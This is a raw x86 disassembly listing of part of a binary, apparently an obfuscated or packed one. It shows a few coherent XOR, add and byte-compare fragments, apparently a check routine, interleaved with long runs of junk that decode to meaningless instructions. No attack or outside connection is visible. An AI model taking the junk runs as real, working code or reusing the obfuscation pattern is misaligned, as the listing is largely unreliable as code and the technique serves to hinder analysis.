  4039dd:	sbb    DWORD PTR [edx-0x68],ebp
  4039e0:	(bad)  
  4039e1:	adc    esi,ebx
  4039e3:	int3   
  4039e4:	popf   
  4039e5:	xchg   BYTE PTR [esi],bl
  4039e7:	push   ecx
  4039e8:	sub    BYTE PTR [eax-0x1a],bh
  4039eb:	pop    esi
  4039ec:	aaa    
  4039ed:	out    dx,eax
  4039ee:	fst    QWORD PTR [edi-0x18]
  4039f1:	iret   
  4039f2:	retf   
  4039f3:	adc    DWORD PTR [esp+ebp*4+0x1855f2a7],ecx
  4039fa:	cdq    
  4039fb:	shr    BYTE PTR [esi+0x3],1
  4039fe:	mov    DWORD PTR [edx],eax
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x17a8c35a
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403ab4
  403a5b:	mov    esp,0xba718a23
  403a60:	sahf   
  403a61:	dec    edx
  403a62:	push   ebx
  403a63:	in     al,dx
  403a64:	add    BYTE PTR [ebx+ebp*8],bl
  403a67:	cmp    ecx,esp
  403a69:	or     DWORD PTR [eax-0xa945bc7],ecx
  403a6f:	mov    ebp,0xb0f5f1f0
  403a74:	adc    eax,0x7818c05b
  403a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a7a:	sti    
  403a7b:	inc    ebx
  403a7c:	add    esi,DWORD PTR [edx-0x36637876]
  403a82:	(bad)  
  403a83:	lahf   
  403a84:	aas    
  403a85:	sub    dh,bh
  403a87:	xlat   BYTE PTR ds:[ebx]
  403a88:	add    eax,0x817168cc
  403a8d:	mov    cl,dl
  403a8f:	add    al,BYTE PTR [edi-0x65]
  403a92:	popf   
  403a93:	xor    eax,0x1d3acc89
  403a98:	pop    ss
  403a99:	test   eax,0x427f0c74
  403a9e:	ret    
  403a9f:	and    DWORD PTR [edi-0x2702760d],edx
  403aa5:	cmp    esp,DWORD PTR ds:0xa6383757
  403aab:	push   ss
  403aac:	loop   0x403a53
  403aae:	enter  0xcaf4,0xf6
  403ab2:	push   ecx
  403ab3:	dec    ebx
  403ab4:	mov    edi,DWORD PTR [ebp+0x30]
  403ab7:	stos   DWORD PTR es:[edi],eax
  403ab8:	and    eax,DWORD PTR [ebp+0x48]
  403abb:	or     al,0xb3
  403abd:	ins    BYTE PTR es:[edi],dx
  403abe:	inc    edx
  403abf:	lock push esp
  403ac1:	sbb    esi,edi
  403ac3:	shl    BYTE PTR [edx+0x287dbd77],1
  403ac9:	xor    ch,BYTE PTR [ebx+0x2]
  403acc:	fs cmp al,dh
  403acf:	mov    cl,0xa5
  403ad1:	scas   al,BYTE PTR es:[edi]
  403ad2:	adc    BYTE PTR [eax+eax*8+0x6f],dl
  403ad6:	retf   
  403ad7:	sub    eax,0x147d6423
  403adc:	les    ecx,FWORD PTR [eax]
  403ade:	rcl    esi,cl
  403ae0:	push   esp
  403ae1:	lods   eax,DWORD PTR ds:[esi]
  403ae2:	addr16 inc ebp
  403ae4:	mov    bh,dl
  403ae6:	pop    esp
  403ae7:	rol    ebx,0x4d
  403aea:	xor    dh,0x9f
  403aed:	icebp  
  403aee:	mov    eax,0x3cfb7697
  403af3:	in     al,dx
  403af4:	jecxz  0x403aa9
  403af6:	jbe    0x403af7
  403af8:	mov    dl,0xd5
  403afa:	mov    esp,0x74e53ec2
  403aff:	push   ecx
  403b00:	xor    DWORD PTR [ebp-0x2b],esp
  403b03:	femms  
  403b05:	adc    DWORD PTR [ebx-0x467e2263],eax
  403b0b:	jb     0x403b7d
  403b0d:	xchg   ebp,eax
  403b0e:	ficom  WORD PTR [esp+eiz*4]
  403b11:	mov    ecx,0x1dac9d09
  403b16:	fsubr  DWORD PTR [ecx-0x7114fe89]
  403b1c:	in     eax,0x88
  403b1e:	mov    ecx,0x53c8b3fa
  403b23:	pushf  
  403b24:	push   esi
  403b25:	loope  0x403b85
  403b27:	das    
  403b28:	fsubp  st(0),st
  403b2a:	sub    cl,ch
  403b2c:	div    DWORD PTR cs:[eax]
  403b2f:	adc    eax,edx
  403b31:	adc    dl,BYTE PTR [esi]
  403b33:	popa   
  403b34:	add    ebp,DWORD PTR [esi+0x7e691357]
  403b3a:	mov    WORD PTR [edx+0x35],gs
  403b3d:	outs   dx,DWORD PTR ds:[esi]
  403b3e:	int3   
  403b3f:	add    DWORD PTR [ecx],ecx
  403b41:	jecxz  0x403acd
  403b43:	(bad)  
  403b44:	pop    eax
  403b45:	sbb    ah,dl
  403b47:	xchg   BYTE PTR [edi+0x8],cl
  403b4a:	cwde   
  403b4b:	sub    dh,BYTE PTR [ecx]
  403b4d:	hlt    
  403b4e:	ret    0x47c7
  403b51:	cmp    ah,BYTE PTR [eax+0x795fd8c9]
  403b57:	add    edi,DWORD PTR [ebx]
  403b59:	aad    0xe4
  403b5b:	fnstenv [ebp+0x39]
  403b5e:	cmp    al,ch
  403b60:	shl    al,cl
  403b62:	int    0x43
  403b64:	jp     0x403b16
  403b66:	stos   BYTE PTR es:[edi],al
  403b67:	sbb    dl,bh
  403b69:	inc    ecx
  403b6a:	jb     0x403b80
  403b6c:	test   al,0x73
  403b6e:	jle    0x403bb7
  403b70:	xor    BYTE PTR [esi+ecx*8+0x7f60bc1d],ah
  403b77:	xor    ebp,DWORD PTR [ebx+0x61]
  403b7a:	cdq    
  403b7b:	in     eax,0xda
  403b7d:	sti    
  403b7e:	sbb    dl,BYTE PTR [edx-0x7ae34577]
  403b84:	das    
  403b85:	stos   DWORD PTR es:[edi],eax
  403b86:	cmp    ecx,eax
  403b88:	fldcw  WORD PTR [ecx]
  403b8a:	cs mov bh,0xbc
  403b8d:	jecxz  0x403b24
  403b8f:	enter  0x2aa2,0xbd
  403b93:	outs   dx,BYTE PTR ds:[esi]
  403b94:	cmp    DWORD PTR [ecx-0x5f],ebx
  403b97:	ins    BYTE PTR es:[edi],dx
  403b98:	std    
  403b99:	mov    bh,BYTE PTR [esi+0x6f]
  403b9c:	sbb    ecx,DWORD PTR [ecx+ebp*8+0x9]
  403ba0:	sbb    eax,0x5c0baf01
  403ba5:	ror    BYTE PTR [ecx],1
  403ba7:	mov    eax,0x1767d936
  403bac:	mov    ch,0xe7
  403bae:	stos   BYTE PTR es:[edi],al
  403baf:	neg    esp
  403bb1:	loop   0x403c09
  403bb3:	mul    DWORD PTR [edi-0x58]
  403bb6:	stos   DWORD PTR es:[edi],eax
  403bb7:	push   ecx
  403bb8:	mov    esi,0x89ff3aab
  403bbd:	shl    BYTE PTR [eax+eax*8+0x58],cl
  403bc1:	addr16 jmp 0x96dc977f
  403bc7:	imul   edi,DWORD PTR [eax],0x8c0c7efe
  403bcd:	mov    bh,0x6f
  403bcf:	retf   
  403bd0:	sti    
  403bd1:	sar    BYTE PTR [eax+eiz*8+0x4441a64e],0x3
  403bd9:	or     ebx,DWORD PTR [eax]
  403bdb:	mov    ebp,0xd971d5ff
  403be0:	xor    al,0x90
  403be2:	add    eax,0x93c2794d
  403be7:	stos   DWORD PTR es:[edi],eax
  403be8:	sub    eax,0x655e0ad8
  403bed:	xor    DWORD PTR [edx+0x5e],edx
  403bf0:	mov    ch,0x5b
  403bf2:	sahf   
  403bf3:	popf   
  403bf4:	mov    eax,ds:0x143aaf55
  403bf9:	mov    dh,0xf9
  403bfb:	loope  0x403bd6
  403bfd:	cmp    ah,BYTE PTR [ebp-0x38f2b3b3]
  403c03:	clc    
  403c04:	jle    0x403c7d
  403c06:	mov    ds:0xf850440,eax
  403c0b:	test   BYTE PTR [edi-0x38fffffb],dl
  403c11:	inc    ebp
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x1dcf48b
  403c29:	xlat   BYTE PTR ds:[ebx]
  403c2a:	add    al,0xbe
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403bc2
  403c35:	inc    ebx
  403c36:	sub    esp,DWORD PTR [edi-0x787eee46]
  403c3c:	shl    BYTE PTR [edi+0x26],1
  403c3f:	aas    
  403c40:	pop    ebx
  403c41:	jl     0x403bdf
  403c43:	cs fwait
  403c45:	test   BYTE PTR [eax+ebx*1+0x42],dl
  403c49:	or     bl,BYTE PTR [eax+0x58]
  403c4c:	push   esi
  403c4d:	lds    esp,FWORD PTR [ebx]
  403c4f:	ds pop edx
  403c51:	pop    DWORD PTR [edi]
  403c53:	addr16 hlt 
  403c55:	scas   eax,DWORD PTR es:[edi]
  403c56:	xor    ebx,ebp
  403c58:	push   edi
  403c59:	push   0x6f
  403c5b:	nop
  403c5c:	idiv   BYTE PTR [ebx+0x50]
  403c5f:	cli    
  403c60:	leave  
  403c61:	dec    edi
  403c62:	out    0x74,eax
  403c64:	push   esp
  403c65:	lea    ebp,[ecx+0x463f0f16]
  403c6b:	(bad)
  403c6e:	mov    cs,WORD PTR [ebp+0x2cfb43ff]
  403c74:	jo     0x403c2e
  403c76:	daa    
  403c77:	scas   al,BYTE PTR es:[edi]
  403c78:	sub    ebp,esi
  403c7a:	xchg   DWORD PTR [edi+0x55f62d97],esi
  403c80:	enter  0x9fac,0x64
  403c84:	daa    
  403c85:	mov    ch,ch
  403c87:	arpl   WORD PTR [ecx+0x13af31ae],bx
  403c8d:	imul   eax,DWORD PTR [esi-0x63],0xccee9a55
  403c94:	jmp    0x2820b5d6
  403c99:	mov    bl,0x1d
  403c9b:	pop    esp
  403c9c:	iret   
  403c9d:	or     BYTE PTR [ecx+0x27268159],dh
  403ca3:	jmp    0x3799b8c5
  403ca8:	rcr    DWORD PTR ds:0xdf63d648,1
  403cae:	jl     0x403cf7
  403cb0:	int3   
  403cb1:	in     al,0xdb
  403cb3:	push   esi
  403cb4:	push   edi
  403cb5:	outs   dx,DWORD PTR ds:[esi]
  403cb6:	sub    esp,DWORD PTR [edx-0x747436be]
  403cbc:	sbb    ebp,DWORD PTR [esi+0x38e940e1]
  403cc2:	mov    dl,0xa5
  403cc4:	mov    ds:0x51865563,eax
  403cc9:	mov    edi,0xb99474a1
  403cce:	call   0xb918:0xaf9d64a8
  403cd5:	sar    edi,cl
  403cd7:	mov    ecx,0xccfc983e
  403cdc:	stc    
  403cdd:	dec    eax
  403cde:	(bad)  
  403cdf:	scas   eax,DWORD PTR es:[edi]
  403ce0:	adc    al,BYTE PTR [edx]
  403ce2:	inc    ebp
  403ce3:	inc    esi
  403ce4:	shl    BYTE PTR [ecx],1
  403ce6:	xchg   DWORD PTR [ebp+0x57],ebp
  403ce9:	cwde   
  403cea:	in     al,0x1c
  403cec:	push   ds
  403ced:	mov    esi,0xa45eec03
  403cf2:	xchg   esp,eax
  403cf3:	mov    bh,0xb9
  403cf5:	or     BYTE PTR [ebx-0x65c4445e],0xfe
  403cfc:	sub    esi,DWORD PTR [ebx]
  403cfe:	int    0x5c
  403d00:	xchg   DWORD PTR [ecx-0x713a48bb],eax
  403d06:	sub    BYTE PTR [ebx+0x31],bh
  403d09:	ds inc esp
  403d0b:	stos   DWORD PTR es:[edi],eax
  403d0c:	ret    0xb244
  403d0f:	es and edx,0x29
  403d13:	out    dx,al
  403d14:	pop    ebx
  403d15:	test   DWORD PTR [esi+0x4e],ebp
  403d18:	sbb    ah,BYTE PTR [ecx-0x5c]
  403d1b:	jno    0x403d6a
  403d1d:	jbe    0x403d3d
  403d1f:	jp     0x403d3b
  403d21:	fcomi  st,st(4)
  403d23:	adc    DWORD PTR [edi+0x0],0x93352cba
  403d2a:	sbb    DWORD PTR [edi],0x78d52aeb
  403d30:	test   BYTE PTR [esi-0x22c7b790],cl
  403d36:	jecxz  0x403d0f
  403d38:	loop   0x403db5
  403d3a:	js     0x403cd2
  403d3c:	push   es
  403d3d:	dec    BYTE PTR [ebp+0x2be51256]
  403d43:	lods   al,BYTE PTR ds:[esi]
  403d44:	idiv   eax
  403d46:	fcomi  st,st(3)
  403d48:	xlat   BYTE PTR ds:[ebx]
  403d49:	dec    edi
  403d4a:	pop    ds
  403d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d4c:	push   ds
  403d4d:	in     al,0x19
  403d4f:	sbb    bl,BYTE PTR [ecx+0x1c]
  403d52:	pop    esp
  403d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d54:	sbb    eax,0x55eb486e
  403d59:	(bad)  
  403d5a:	pop    edi
  403d5b:	mov    ch,0xfd
  403d5d:	sahf   
  403d5e:	pop    ecx
  403d5f:	mov    ds:0xf5cef96f,al
  403d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d65:	mov    ds:0xbf70daaa,al
  403d6a:	cld    
  403d6b:	add    esp,DWORD PTR [eax+0x2a2bd943]
  403d71:	add    eax,0x98350605
  403d76:	sbb    al,0xbe
  403d78:	inc    esp
  403d79:	cli    
  403d7a:	sbb    al,0x7c
  403d7c:	js     0x403d3a
  403d7e:	jp     0x403d47
  403d80:	ins    BYTE PTR es:[edi],dx
  403d81:	pop    eax
  403d82:	push   ds
  403d83:	popf   
  403d84:	mov    WORD PTR [ebp+0x42],es
  403d87:	hlt    
  403d88:	jmp    0x337a:0x5c9155ea
  403d8f:	xlat   BYTE PTR ds:[ebx]
  403d90:	arpl   WORD PTR [edx-0x6f6f3aa0],bx
  403d96:	(bad)  
  403d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d98:	xor    ah,ah
  403d9a:	ja     0x403e0e
  403d9c:	jbe    0x403d66
  403d9e:	jecxz  0x403daf
  403da0:	adc    eax,0x7fc0b88b
  403da5:	push   edi
  403da6:	inc    esi
  403da7:	and    eax,0xfdba4b99
  403dac:	inc    eax
  403dad:	stos   BYTE PTR es:[edi],al
  403dae:	push   ebp
  403daf:	and    ch,BYTE PTR [eax+edi*4]
  403db2:	sub    eax,0x475c2d7f
  403db7:	dec    edi
  403db8:	fstp   DWORD PTR [ebx-0x6924740d]
  403dbe:	inc    ebp
  403dbf:	nop
  403dc0:	xchg   BYTE PTR [esi-0x4f46ac9a],dh
  403dc6:	les    esi,FWORD PTR [eax]
  403dc8:	fist   DWORD PTR [eax-0x773215e4]
  403dce:	imul   ebp,DWORD PTR [eax-0x7f],0x28703833
  403dd5:	arpl   WORD PTR [ebx-0x21],sp
  403dd8:	ja     0x403e0e
  403dda:	mov    ah,0x40
  403ddc:	loopne 0x403deb
  403dde:	mov    edi,0x6349b44f
  403de3:	out    dx,al
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x53a5bf96],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e13
  403e11:	out    dx,eax
  403e12:	add    BYTE PTR [edx-0x76],ch
  403e15:	pop    esp
  403e16:	or     al,0x76
  403e18:	ss sbb eax,0x3235dc95
  403e1e:	int3   
  403e1f:	inc    edx
  403e20:	lahf   
  403e21:	mov    al,0x91
  403e23:	inc    eax
  403e24:	adc    al,0xa3
  403e26:	jecxz  0x403df7
  403e28:	aad    0xd6
  403e2a:	xchg   BYTE PTR [edx+eax*8-0x71],bh
  403e2e:	das    
  403e2f:	pop    esp
  403e30:	push   esp
  403e31:	enter  0xa596,0x37
  403e35:	xor    esp,esp
  403e37:	xor    dl,dl
  403e39:	mov    bl,0x24
  403e3b:	or     DWORD PTR [ebx],ebp
  403e3d:	mov    ah,0x15
  403e3f:	aaa    
  403e40:	and    edx,DWORD PTR [eax-0x182e06c0]
  403e46:	sub    eax,0xe7bc42a1
  403e4b:	loope  0x403e01
  403e4d:	lock outs dx,DWORD PTR ds:[esi]
  403e4f:	add    al,0x58
  403e51:	sub    eax,0xd269cab6
  403e56:	adc    al,0x8f
  403e58:	fwait
  403e59:	push   ebp
  403e5a:	retf   
  403e5b:	lods   eax,DWORD PTR ds:[si]
  403e5d:	cmp    BYTE PTR [ebp+0x5009ee59],bl
  403e63:	inc    eax
  403e64:	fdiv   DWORD PTR [ebp+0x75ed8499]
  403e6a:	mov    ecx,0xfd7a67b
  403e6f:	push   eax
  403e70:	fiadd  WORD PTR [eax-0x22943759]
  403e76:	adc    ah,BYTE PTR [edi+0x26]
  403e79:	and    ecx,DWORD PTR [edx+eax*8+0x1]
  403e7d:	test   al,0x61
  403e7f:	or     DWORD PTR [eax],esp
  403e81:	inc    ecx
  403e82:	outs   dx,BYTE PTR ds:[esi]
  403e83:	jnp    0x403e3a
  403e85:	sub    BYTE PTR [ecx-0x6b1ddefb],dl
  403e8b:	pop    edx
  403e8c:	arpl   WORD PTR ds:0x1487bfe3,bx
  403e92:	add    al,0x36
  403e94:	es scas eax,DWORD PTR es:[edi]
  403e96:	out    dx,al
  403e97:	fs retf 0x2d39
  403e9b:	rcr    DWORD PTR [eax+0x7ab1f3cd],cl
  403ea1:	xor    DWORD PTR [eax-0x24ae1101],ebp
  403ea7:	test   eax,0x36945c1b
  403eac:	push   ecx
  403ead:	push   ecx
  403eae:	cs dec esi
  403eb0:	call   0x8fbb:0xbb19b83
  403eb7:	cli    
  403eb8:	dec    ebx
  403eb9:	hlt    
  403eba:	imul   eax,DWORD PTR [ecx+0x49],0x77
  403ebe:	dec    esp
  403ebf:	inc    eax
  403ec0:	jae    0x403e62
  403ec2:	call   0x5f89:0xbd2b4228
  403ec9:	pop    DWORD PTR [eax+0x30c1b614]
  403ecf:	ror    BYTE PTR [ebx+0x70623c68],0xec
  403ed6:	loop   0x403f29
  403ed8:	dec    edi
  403ed9:	out    dx,eax
  403eda:	ins    BYTE PTR es:[edi],dx
  403edb:	push   eax
  403edc:	shld   DWORD PTR [ebx-0x16],ebx,cl
  403ee0:	jae    0x403e6c
  403ee2:	push   0xffffffa9
  403ee4:	xchg   DWORD PTR [edx+ebx*4+0x110ab0e4],esp
  403eeb:	es xchg esp,eax
  403eed:	fidiv  DWORD PTR [esi+0x3a]
  403ef0:	test   DWORD PTR [edx+0x456fad81],ebx
  403ef6:	or     DWORD PTR [edi],0xdfb4d4e0
  403efc:	push   eax
  403efd:	pop    eax
  403efe:	inc    edi
  403eff:	(bad)  
  403f00:	out    0x4e,eax
  403f02:	xchg   BYTE PTR [edx+esi*8+0x56589418],dl
  403f09:	aam    0xbb
  403f0b:	fstp   QWORD PTR [esi]
  403f0d:	out    0x34,eax
  403f0f:	mov    bl,0x78
  403f11:	cs call 0xf4c07fe9
  403f17:	jg     0x403f1c
  403f19:	adc    al,0x76
  403f1b:	mov    bh,0x13
  403f1d:	push   edi
  403f1e:	aad    0xa
  403f20:	dec    edi
  403f21:	sub    ah,BYTE PTR [ebx]
  403f23:	outs   dx,DWORD PTR ds:[esi]
  403f24:	adc    eax,0xdc05d562
  403f29:	xchg   edx,eax
  403f2a:	mov    DWORD PTR [esi-0x34],esi
  403f2d:	sbb    al,0xeb
  403f2f:	pushf  
  403f30:	test   al,0x29
  403f33:	or     al,0x56
  403f35:	les    edi,FWORD PTR [edi+0x45]
  403f38:	jmp    0xe7a94639
  403f3d:	stos   DWORD PTR es:[edi],eax
  403f3e:	jecxz  0x403f4a
  403f40:	mov    ds:0x5d04961a,al
  403f45:	push   eax
  403f46:	xor    edi,DWORD PTR [esi+0x1bd4d8af]
  403f4c:	out    0xfa,al
  403f4e:	jns    0x403f8b
  403f50:	in     al,dx
  403f51:	mov    ch,0x32
  403f53:	test   DWORD PTR [ecx+0x52d48039],edi
  403f59:	rol    DWORD PTR [esi-0x1e16be15],cl
  403f5f:	les    esi,FWORD PTR [edx+0x38ec70c]
  403f65:	mov    edx,ecx
  403f67:	pop    edx
  403f68:	sbb    edi,DWORD PTR [edx+0x7b6e99ee]
  403f6e:	in     al,dx
  403f6f:	and    eax,0xce9a94b1
  403f74:	sub    esi,ecx
  403f76:	adc    eax,0xf897022f
  403f7b:	cdq    
  403f7c:	add    esi,esp
  403f7e:	lock aam 0x6b
  403f81:	jb     0x403ff5
  403f83:	mov    eax,ds
  403f85:	jle    0x403fea
  403f87:	inc    esi
  403f88:	rol    DWORD PTR [esi-0x73891990],1
  403f8e:	(bad)  
  403f8f:	pop    esp
  403f90:	call   0x83cf:0xf6b361bb
  403f97:	loope  0x403fd3
  403f99:	fst    QWORD PTR [ebx]
  403f9b:	mov    BYTE PTR es:[eax+0x7a],ch
  403f9f:	sar    dl,1
  403fa1:	push   ecx
  403fa2:	jno    0x403f81
  403fa4:	inc    eax
  403fa5:	mov    al,0x6b
  403fa7:	pop    ebp
  403fa8:	xchg   edi,eax
  403fa9:	out    0xaa,al
  403fab:	push   ecx
  403fac:	lds    edx,FWORD PTR [edx+esi*2+0x4e]
  403fb0:	mov    bl,0x28
  403fb2:	dec    edi
  403fb3:	xor    eax,0x60b52761
  403fb8:	repz mov ebp,0xf0686eb
  403fbe:	sar    BYTE PTR [ecx-0x75],1
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	adc    WORD PTR [ebp-0x20],0x22
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f94
  403fe6:	ins    DWORD PTR es:[edi],dx
  403fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe8:	xchg   BYTE PTR [edi+0x260a0e8d],ah
  403fee:	mov    ds:0x943f3c1a,al
  403ff3:	mov    edi,DWORD PTR [ebp+0x65]
  403ff6:	add    al,0x44
  403ff8:	lds    esp,FWORD PTR [eax+0x1b]
  403ffb:	popw   ds
  403ffd:	sti    
  403ffe:	inc    edx
  403fff:	xor    al,0x41
  404001:	out    0x7b,al
  404003:	inc    ebx
  404004:	mov    ebx,0xef25264a
  404009:	lock push ss
  40400b:	fiadd  WORD PTR [edx+0x591b837c]
  404011:	es hlt 
  404013:	mov    ah,0xc8
  404015:	and    DWORD PTR [edi],edx
  404017:	mov    edx,0x2c59871a
  40401c:	jge    0x404009
  40401e:	adc    DWORD PTR [ebp+0x25],edi
  404021:	dec    esi
  404022:	push   ss
  404023:	lods   al,BYTE PTR ds:[esi]
  404024:	cmp    dl,BYTE PTR [edx]
  404026:	rol    DWORD PTR [edi+0x7cf31a14],0x1e
  40402d:	push   es
  40402e:	and    DWORD PTR [esi+0x5edb9638],0xd14bd427
  404038:	mov    WORD PTR [edi],?
  40403a:	rcl    DWORD PTR [eax],1
  40403c:	imul   ebx,DWORD PTR [edi],0xffffffd1
  40403f:	sub    esp,eax
  404041:	adc    al,0xc4
  404043:	ror    DWORD PTR [ebx],0x58
  404046:	mov    al,0x6c
  404048:	mov    edx,0x8d61a179
  40404d:	fst    QWORD PTR [ebx]
  40404f:	or     DWORD PTR [ecx-0x187e3723],eax
  404055:	pop    ds
  404056:	xlat   BYTE PTR ds:[ebx]
  404057:	and    al,bh
  404059:	sbb    BYTE PTR [eax],bh
  40405b:	outs   dx,BYTE PTR ds:[esi]
  40405c:	stos   DWORD PTR es:[edi],eax
  40405d:	jb     0x404009
  40405f:	stc    
  404060:	mov    dh,0x1e
  404062:	xchg   edx,eax
  404063:	pop    ebp
  404064:	add    ebx,eax
  404066:	sbb    eax,0x50015bc9
  40406b:	shr    eax,cl
  40406d:	or     al,0x4b
  40406f:	out    dx,al
  404070:	xchg   ebx,eax
  404071:	test   DWORD PTR ds:0x4a51e039,esi
  404077:	fdivr  DWORD PTR [ebp-0x73754124]
  40407d:	jo     0x4040a3
  40407f:	pushf  
  404080:	cmp    al,0x42
  404082:	jno    0x404026
  404084:	outs   dx,BYTE PTR fs:[esi]
  404086:	add    BYTE PTR [edx+0x519db250],dl
  40408c:	aad    0xba
  40408e:	dec    edi
  40408f:	lods   al,BYTE PTR ds:[esi]
  404090:	lods   al,BYTE PTR ds:[esi]
  404091:	fidiv  DWORD PTR fs:[esi+0x49]
  404095:	outs   dx,BYTE PTR ds:[esi]
  404096:	icebp  
  404097:	jb     0x4040db
  404099:	(bad)  
  40409a:	leave  
  40409b:	std    
  40409c:	into   
  40409d:	jns    0x404118
  40409f:	call   0x42f1:0x60f2e226
  4040a6:	cdq    
  4040a7:	and    dl,dl
  4040a9:	cmp    eax,0xb3cdc4e7
  4040ae:	call   0xe7ac4610
  4040b3:	xchg   esp,eax
  4040b4:	pop    edi
  4040b5:	dec    esp
  4040b6:	pop    esi
  4040b7:	pop    ebp
  4040b8:	inc    ebx
  4040b9:	outs   dx,DWORD PTR ds:[esi]
  4040ba:	dec    esp
  4040bb:	stos   DWORD PTR es:[edi],eax
  4040bc:	dec    esi
  4040bd:	adc    dh,BYTE PTR [edx-0x3f]
  4040c0:	dec    ebx
  4040c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040c2:	mov    ecx,DWORD PTR [ebx-0x6f]
  4040c5:	out    dx,eax
  4040c6:	sub    ecx,DWORD PTR [edi]
  4040c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040c9:	test   eax,0xa02e8c33
  4040ce:	fnstsw WORD PTR [esi-0x74]
  4040d1:	into   
  4040d2:	rcl    DWORD PTR [eax],0xa8
  4040d5:	xchg   esp,eax
  4040d6:	pop    edi
  4040d7:	outs   dx,DWORD PTR ds:[esi]
  4040d8:	pop    ebp
  4040d9:	in     al,0xc5
  4040db:	sbb    esp,DWORD PTR [ebp-0x9bdac72]
  4040e1:	push   eax
  4040e2:	fadd   QWORD PTR fs:[edx+0x13]
  4040e6:	hlt    
  4040e7:	adc    al,0xee
  4040e9:	inc    ebx
  4040ea:	adc    al,BYTE PTR [esi+ebx*8]
  4040ed:	je     0x404090
  4040ef:	mov    ds:0xb6200968,eax
  4040f4:	(bad)  
  4040f5:	push   0xffffffb3
  4040f7:	dec    ebp
  4040f8:	gs push ss
  4040fa:	ja     0x4040c8
  4040fc:	fidivr DWORD PTR [eax+0x119e5e82]
  404102:	jmp    0xbe43e736
  404107:	idiv   eax
  404109:	pusha  
  40410a:	sbb    cl,bh
  40410c:	(bad)  
  40410e:	fwait
  40410f:	push   ecx
  404110:	jns    0x40410f
  404112:	(bad)  
  404113:	dec    edi
  404114:	dec    edx
  404115:	les    edx,FWORD PTR [edx]
  404117:	xchg   edx,eax
  404118:	popa   
  404119:	mov    ebx,0x29a0816c
  40411e:	push   eax
  40411f:	xor    DWORD PTR [ebx],esi
  404121:	inc    ebp
  404122:	jmp    0x4a80:0xb4fdb7a3
  404129:	cld    
  40412a:	in     al,0x6a
  40412c:	lods   eax,DWORD PTR ds:[esi]
  40412d:	repz out 0x74,al
  404130:	push   esi
  404131:	pop    DWORD PTR [esi+0x4e]
  404134:	test   DWORD PTR [edx],edx
  404136:	cmp    DWORD PTR [esi+0x61bdee7f],0xffffffde
  40413d:	xor    ebx,DWORD PTR [ebp+0x36]
  404140:	inc    ecx
  404141:	mov    cl,0x8d
  404143:	inc    ebx
  404144:	in     al,0x84
  404146:	pop    ebp
  404147:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  404149:	and    al,0xc6
  40414b:	mov    al,0xe
  40414d:	cmp    bh,bl
  40414f:	jg     0x404148
  404151:	jo     0x404199
  404153:	loop   0x40410a
  404155:	aaa    
  404156:	xor    BYTE PTR [edx],ch
  404158:	inc    ebx
  404159:	(bad)  
  40415a:	stos   BYTE PTR es:[edi],al
  40415b:	out    dx,eax
  40415c:	pushf  
  40415d:	(bad)  
  40415f:	xchg   ecx,eax
  404160:	xor    DWORD PTR [ebp+0x3c81c4eb],ecx
  404166:	pop    esi
  404167:	ja     0x404181
  404169:	aas    
  40416a:	je     0x4041d5
  40416c:	(bad)  
  40416e:	in     eax,0xb3
  404170:	aaa    
  404171:	dec    BYTE PTR [ebx]
  404173:	pushf  
  404174:	push   ecx
